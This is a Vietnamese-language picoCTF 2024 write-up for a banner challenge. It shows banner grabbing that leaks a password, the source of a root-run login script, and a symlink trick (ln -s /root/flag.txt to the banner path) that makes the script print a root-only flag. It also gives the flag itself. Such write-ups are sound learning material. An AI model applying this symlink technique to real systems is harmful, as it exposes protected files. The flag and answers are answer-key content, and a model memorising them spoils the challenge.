---
author: atuanlab
date: 10-04-2024
email: ng.atuanlab.yt@gmail.com
---

# [2024] [PICOCTF] [300-POINTS] DONT YOU LOVE BANNERS

## 1. THÔNG TIN CHUNG 
### Tác giả và mô tả chung 
- Tác giả: Loic Shema / syreal
- Mô tả chung 
    - Can you abuse the banner?
    - Additional details will be available after launching your challenge instance.

### Gợi ý 
- Do you know about symlinks?
- Maybe some small password cracking or guessing



## 2. TÓM TẮT QUÁ TRÌNH THỰC HIỆN 
- Có tới 2 Server để khai thác ấy
- Truy cập SERVER 01 bằng `telnet` (thu được Pass) và truy cập SERVER 02 bằng `nc`
- Nhập Pass và trả lời câu hỏi
    - Câu 01 là `DEFCON`
    - Câu 02 là `JOHN DRAPER`
- Tạo Symbolink cua File "flag.txt" bằng: `ln -s /root/flag.txt /home/plaer/banner`
- Truy cập lại SERVER 02 và thu được nội dung của cờ


## 3. CHI TIẾT QUÁ TRÌNH THỰC HIỆN 

### Khai thác thông tin tại SERVER 01 

Sử dụng telnet để truy cập SERVER 01 bằng lệnh: `telnet tethys.picoctf.net 51968`

```
┌──(kali㉿kali)-[~/Desktop/New Folder]
└─$ telnet tethys.picoctf.net 51968
Trying 3.140.72.182...
Connected to tethys.picoctf.net.
Escape character is '^]'.
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
^C
Connection closed by foreign host.
```

Thu được Password là: `My_Passw@rd_@1234`


### Truy cập SERVER 02 

Truy cập SERVER 02 bằng `nc`, một dạng như banner hiện ra và nhập Password thu được từ SERVER 01 để tiếp tục quá trình 

Dùng `nc` để kết nối với SERVER 02

```
                                                        
┌──(kali㉿kali)-[~/Desktop/New Folder]
└─$ nc tethys.picoctf.net 55551
*************************************
**************WELCOME****************
*************************************

what is the password? 
^C
```

Nhập Password là `My_Passw@rd_@1234` và tra lời câu hỏi 
- Câu hỏi 01 là `DEFCOBN`
- Câu hỏi 02 là `JOHN DRAPER`

```
┌──(kali㉿kali)-[~/Desktop/New Folder]
└─$ nc tethys.picoctf.net 55551
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
JOHN DRAPER
player@challenge:~$ 

player@challenge:~$ ls 
ls 
banner  text
```

Kết thúc là có thể truy cập được Server.

### Tạo Symbolic Link của file banner 

Dạo một vòng thì tại `/root` có tập tin `flag.txt`, chắc chắn đây là nội dung của cờ. Vấn đề là không thể mở do quyền

```
player@challenge:/root$ cat flag.txt
cat flag.txt
cat: flag.txt: Permission denied
player@challenge:/root$ 

```

Đọc thử nội dung của tập tin `script.py` thì đây chính là tập tin tạo nên quá trình đăng nhập đầu tiên khi truy cập vào SERVER 02

```
player@challenge:/root$ cat script.py
cat script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt

```

Một điểm chú ý là đoạn code dưới đây. Cơ bản là nó sẽ hiển thị các nội dung của File `banner` và tiếp tục chương trình.
```
try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
```

Như vậy thì ý tưởng của mình lúc này là tạo một `banner` mới là một symbolink của file `flag.txt`. Kết quả là khi chạy `script.py` cũng sẽ hiển thị nội dung của `flag.txt`

Dầu tiên thì chuyển tạm thời file banner cũ thành banner.bk bằng: `cp banner banner.bk`

```
player@challenge:~$ cp banner banner.bk
cp banner banner.bk
player@challenge:~$ ls
ls
banner  banner.bk  text
```

Xóa file `banner` cũ bằng lệnh: `rm banner`

```
player@challenge:~$ rm banner
rm banner
player@challenge:~$ ls
ls
banner.bk  text
player@challenge:~$ 
```

Tạo symbolink của `banner` từ `flag.txt` bằng lệnh: `ln -s /root/flag.txt /home/player/banner`

```
player@challenge:~$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/banner
player@challenge:~$ ls
ls
banner  banner.bk  text
player@challenge:~$ 
```

Thoát ra và truy cập lại bằng `nc`. Lúc này, thay vì hiển thị Banner thì sẽ hiển thị nội dung của cờ 

```
┌──(kali㉿kali)-[~/Desktop/New Folder]
└─$ nc tethys.picoctf.net 55551
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_68ca8b23}

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
^C
```

## 4. THU THẬP NỘI DUNG CỦA CỜ 
Nội dung của cờ: `picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_68ca8b23}`



## 5. TÀI LIỆU THAM KHẢO
- https://www.freecodecamp.org/news/linux-ln-how-to-create-a-symbolic-link-in-linux-example-bash-command/